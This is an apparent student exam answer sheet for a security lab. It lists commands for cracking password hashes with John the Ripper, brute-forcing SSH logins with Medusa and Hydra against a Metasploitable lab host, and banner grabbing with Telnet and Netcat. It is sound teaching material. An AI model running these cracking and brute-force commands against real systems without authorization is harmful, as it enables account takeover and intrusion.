**Sample Slip 15 – Practical Solutions**

_Answers prepared from sample.docx_

Prepared in an easy-to-read, exam-friendly format.  
_Use only on authorized lab systems and academic test environments._

| Format | Recite-and-perform practical answers |
| --- | --- |
| Purpose | Quick writing help + command recall during viva/practical |

**Exam tip:** Write the command first, then one or two short explanation lines. That usually looks neat and complete.

# Q1. John the Ripper / Medusa / Hydra

**a) Crack hashes in hash.txt**

john hash.txt

**Answer:** John loads the hashes and starts cracking them automatically.

**b) Dictionary attack with rockyou.txt**

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

**Answer:** This checks common passwords from the wordlist against the hashes.

**c) Why dictionary attacks work**

**Answer:** They are effective because many users still choose simple, common, and reused passwords.

**d) Medusa brute-force on SSH (Metasploitable lab)**

medusa -h 192.168.56.101 -u msfadmin -P pass.txt -M ssh

**Answer:** Medusa tries each password in pass.txt for the SSH service.

**e) Command using username msfadmin and pass.txt**

medusa -h 192.168.56.101 -u msfadmin -P pass.txt -M ssh

**Answer:** Same as above because the username and password file are already specified.

**f) Hydra brute-force on SSH**

hydra -l msfadmin -P pass.txt ssh://192.168.56.101

**Answer:** Hydra performs SSH login attempts and prints valid credentials if found.

# Q2. Banner Grabbing with Telnet and Netcat

**a) Telnet banner grabbing on port 80**

telnet 192.168.56.101 80

HEAD / HTTP/1.0

**Answer:** After pressing Enter twice, the server returns HTTP headers such as Server, Date, and Content-Type.

**b) Connect to FTP on port 21 and identify banner**

telnet 192.168.56.101 21

**Answer:** Typical banner: 220 (vsFTPd 2.3.4). The banner can reveal the FTP software name, version, and service status.

**c) Netcat banner grabbing on port 22**

nc -v 192.168.56.101 22

**Answer:** Typical output shows the SSH service banner, for example OpenSSH version details.

**d) Netcat on port 80 for HTTP headers**

nc 192.168.56.101 80

HEAD / HTTP/1.0

**Answer:** Netcat is more flexible than Telnet for security testing because it is lightweight, scriptable, and commonly used in VAPT workflows.

# Q3. Viva – one-line revision points

*   John the Ripper: password cracking tool.
*   Medusa and Hydra: brute-force login testing tools.
*   Banner grabbing: finding service name and version.
*   Telnet and Netcat: simple tools to talk to a network service.
*   Dictionary attack: checking common passwords from a wordlist.